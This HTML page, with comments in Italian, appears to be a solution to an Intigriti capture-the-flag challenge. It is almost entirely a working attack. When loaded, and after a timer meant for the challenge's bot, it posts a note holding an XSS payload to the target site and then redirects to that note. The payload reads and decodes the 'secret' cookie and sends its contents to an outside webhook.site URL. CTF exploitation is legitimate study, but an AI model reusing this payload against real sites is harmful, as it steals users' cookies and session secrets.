<!DOCTYPE html>
<html>
<head>
    <title>Leaky Flagment Solution</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #ee9ca7, #ffdde1);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .target {
            width: 300px;
            height: 300px;
            background-color: #ff4081;
            color: white;
            border-radius: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0 auto;
            cursor: pointer;
            animation: pulse 2s infinite;
            font-size: 28px;
            font-weight: bold;
        }
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0.4); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(255, 64, 129, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 64, 129, 0); }
        }
    </style>
</head>
<body>
    <div class="target" id="target">
        CLICCA QUI
    </div>

    <script>
        // Ottieni un ID casuale per l'exploit
        const exploitId = Math.floor(Math.random() * 1000000);
        
        // URL del webhook
        const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
        
        // Payload XSS
        const xssPayload = `<img src=x onerror="(function(){
            // Estrae il cookie 'secret'
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('secret='));
            if (!cookie) return;
            
            // Decodifica il cookie base64
            const secretValue = cookie.split('=')[1].trim();
            const decodedSecret = atob(secretValue);
            
            // Estrae la flag (parte dopo i due punti)
            const colonIndex = decodedSecret.indexOf(':');
            if (colonIndex === -1) return;
            
            const flag = decodedSecret.substring(colonIndex + 1);
            
            // Invia la flag al webhook tramite immagine (aggira CORS)
            const img = new Image();
            img.src = '${webhookUrl}?flag=' + encodeURIComponent(flag);
            document.body.appendChild(img);
        })()">`;
        
        // Funzione per avviare l'exploit
        function runExploit() {
            // Crea un documento HTML che crea la nota XSS
            const html = `
            <!DOCTYPE html>
            <html>
            <body>
                <h1>Creazione nota...</h1>
                <script>
                    window.onload = function() {
                        console.log('Creazione della nota malevola...');
                        
                        fetch('https://challenge-0325.intigriti.io/api/post', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                title: 'Note ${exploitId}',
                                content: ${JSON.stringify(xssPayload)},
                                use_password: 'false'
                            }),
                            credentials: 'include'
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Nota creata con ID:', data.id);
                            // Reindirizza alla nota per attivare l'XSS
                            window.location.href = 'https://challenge-0325.intigriti.io/note/' + data.id;
                        })
                        .catch(error => {
                            console.error('Errore:', error);
                            document.body.innerHTML += '<p>Errore: ' + error.message + '</p>';
                        });
                    };
                <\/script>
            </body>
            </html>
            `;
            
            // Crea un blob e un URL per il documento HTML
            const blob = new Blob([html], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            
            // Reindirizza al documento HTML che creer√† la nota
            window.location.href = url;
        }
        
        // Aggiungi l'handler del click
        document.getElementById('target').addEventListener('click', runExploit);
        
        // Per il bot: avvia automaticamente l'exploit dopo un breve ritardo
        // Il bot clicca sempre al centro della pagina
        setTimeout(runExploit, 1000);
    </script>
</body>
</html>
